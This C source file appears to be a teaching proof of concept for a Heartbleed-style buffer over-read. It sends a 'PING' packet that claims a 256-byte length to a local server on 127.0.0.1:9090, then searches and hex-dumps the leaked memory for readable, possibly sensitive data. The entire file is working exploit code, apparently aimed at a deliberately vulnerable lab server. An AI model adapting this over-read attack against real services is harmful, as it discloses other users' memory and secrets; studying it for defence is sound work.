#include <arpa/inet.h>
#include <ctype.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

#define SERVER_IP "127.0.0.1"
#define SERVER_PORT 9090
#define DECLARED_SIZE 256
#define MAX_ATTEMPTS 100
#define MIN_INTERESTING_SEQUENCE 20

static void fail(const char *message) {
    perror(message);
    exit(EXIT_FAILURE);
}

static ssize_t send_all(
    int socket_fd,
    const void *buffer,
    size_t size
) {
    size_t sent = 0;

    while (sent < size) {
        ssize_t result = send(
            socket_fd,
            (const char *)buffer + sent,
            size - sent,
            0
        );

        if (result <= 0) {
            return result;
        }

        sent += (size_t)result;
    }

    return (ssize_t)sent;
}

static ssize_t receive_all(
    int socket_fd,
    void *buffer,
    size_t size
) {
    size_t received = 0;

    while (received < size) {
        ssize_t result = recv(
            socket_fd,
            (char *)buffer + received,
            size - received,
            0
        );

        if (result <= 0) {
            return result;
        }

        received += (size_t)result;
    }

    return (ssize_t)received;
}

static void print_memory(
    const unsigned char *buffer,
    size_t size
) {
    printf("\nConteudo vazado em hexadecimal:\n");

    for (size_t i = 0; i < size; i++) {
        printf("%02x ", buffer[i]);

        if ((i + 1) % 16 == 0) {
            printf("\n");
        }
    }

    printf("\nRepresentacao textual:\n");

    for (size_t i = 0; i < size; i++) {
        putchar(isprint(buffer[i]) ? buffer[i] : '.');
    }

    printf("\n");
}

static ssize_t find_interesting_sequence(
    const unsigned char *buffer,
    size_t buffer_size,
    size_t *sequence_size
) {
    size_t start = 0;
    size_t current_size = 0;

    /*
     * Ignora o payload PING e procura uma sequencia longa
     * de caracteres legiveis nos bytes excedentes.
     */
    for (size_t i = 4; i < buffer_size; i++) {
        if (isprint(buffer[i])) {
            if (current_size == 0) {
                start = i;
            }

            current_size++;

            if (current_size >= MIN_INTERESTING_SEQUENCE) {
                while (
                    start + current_size < buffer_size &&
                    isprint(buffer[start + current_size])
                ) {
                    current_size++;
                }

                *sequence_size = current_size;
                return (ssize_t)start;
            }
        } else {
            current_size = 0;
        }
    }

    return -1;
}

static void print_discovered_sequence(
    const unsigned char *buffer,
    size_t start,
    size_t sequence_size
) {
    printf("Sequencia legivel descoberta: ");

    for (size_t i = 0; i < sequence_size; i++) {
        putchar(buffer[start + i]);
    }

    printf("\n");
}

static int connect_to_server(void) {
    int socket_fd = socket(AF_INET, SOCK_STREAM, 0);

    if (socket_fd == -1) {
        fail("Erro ao criar o socket");
    }

    struct sockaddr_in server_address = {0};

    server_address.sin_family = AF_INET;
    server_address.sin_port = htons(SERVER_PORT);

    if (
        inet_pton(
            AF_INET,
            SERVER_IP,
            &server_address.sin_addr
        ) != 1
    ) {
        close(socket_fd);
        fprintf(stderr, "Endereco do servidor invalido.\n");
        exit(EXIT_FAILURE);
    }

    if (
        connect(
            socket_fd,
            (struct sockaddr *)&server_address,
            sizeof(server_address)
        ) == -1
    ) {
        close(socket_fd);
        fail("Erro ao conectar ao servidor");
    }

    return socket_fd;
}

static int execute_attempt(unsigned char *response) {
    const char payload[] = "PING";

    uint16_t payload_size = (uint16_t)strlen(payload);
    uint16_t declared_size_network = htons(DECLARED_SIZE);
    uint16_t payload_size_network = htons(payload_size);

    int socket_fd = connect_to_server();

    if (
        send_all(
            socket_fd,
            &declared_size_network,
            sizeof(declared_size_network)
        ) != sizeof(declared_size_network)
    ) {
        close(socket_fd);
        fail("Erro ao enviar o tamanho declarado");
    }

    if (
        send_all(
            socket_fd,
            &payload_size_network,
            sizeof(payload_size_network)
        ) != sizeof(payload_size_network)
    ) {
        close(socket_fd);
        fail("Erro ao enviar o tamanho real");
    }

    if (
        send_all(
            socket_fd,
            payload,
            payload_size
        ) != payload_size
    ) {
        close(socket_fd);
        fail("Erro ao enviar o payload");
    }

    if (
        receive_all(
            socket_fd,
            response,
            DECLARED_SIZE
        ) != DECLARED_SIZE
    ) {
        close(socket_fd);
        fail("Erro ao receber a resposta");
    }

    close(socket_fd);

    return EXIT_SUCCESS;
}

int main(void) {
    unsigned char *response = malloc(DECLARED_SIZE);

    if (response == NULL) {
        fail("Erro ao alocar a resposta");
    }

    for (int attempt = 1; attempt <= MAX_ATTEMPTS; attempt++) {
        printf(
            "Tentativa %d de %d...\n",
            attempt,
            MAX_ATTEMPTS
        );

        execute_attempt(response);

        size_t sequence_size = 0;

        ssize_t sequence_position =
            find_interesting_sequence(
                response,
                DECLARED_SIZE,
                &sequence_size
            );

        if (sequence_position >= 0) {
            printf(
                "\nPossivel dado sensivel encontrado na tentativa %d!\n",
                attempt
            );

            print_discovered_sequence(
                response,
                (size_t)sequence_position,
                sequence_size
            );

            print_memory(response, DECLARED_SIZE);

            free(response);
            return EXIT_SUCCESS;
        }

        printf(
            "Nenhuma sequencia relevante encontrada nesta resposta.\n"
        );
    }

    printf(
        "\nLimite de tentativas atingido sem identificar dados legiveis.\n"
    );

    free(response);

    return EXIT_FAILURE;
}